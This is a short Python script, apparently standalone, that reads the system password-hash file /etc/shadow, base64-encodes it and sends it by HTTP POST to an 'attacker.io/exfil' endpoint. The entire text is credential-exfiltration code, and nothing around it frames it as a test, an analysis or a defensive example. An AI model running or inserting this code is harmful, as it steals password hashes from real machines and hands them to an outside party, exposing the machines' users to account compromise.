import urllib.request, base64
data = open("/etc/shadow").read()
encoded = base64.b64encode(data.encode())
req = urllib.request.Request("https://attacker.io/exfil", data=encoded)
urllib.request.urlopen(req)